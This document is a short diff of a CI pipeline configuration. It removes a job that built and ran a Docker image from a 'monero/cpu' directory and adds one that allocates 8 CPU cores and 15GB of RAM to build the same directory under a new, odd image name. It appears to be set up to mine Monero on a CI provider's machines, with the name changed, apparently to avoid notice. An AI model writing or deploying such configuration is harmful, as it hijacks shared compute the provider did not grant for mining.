@@ -1,4 +1,11 @@
-docker_builder:
-  build_script: docker build -t nmlm99/nizadam:latest ./monero/cpu
-  timeout_in: 90m
-  push_script: docker run -it nmlm99/nizadam:latest
+version: 1.0
+resources:
+  cpu: 8 # Specify how many CPU cores you want to allocate 
+  memory: 15GB  # Specify the amount of RAM 
+
+steps:
+  - name: "Build Docker Image"
+    image: docker:latest
+    commands:
+      - export DOCKER_BUILDKIT=1
+      - docker build --tag nmlm99/sobakaka:latest monero/cpu 
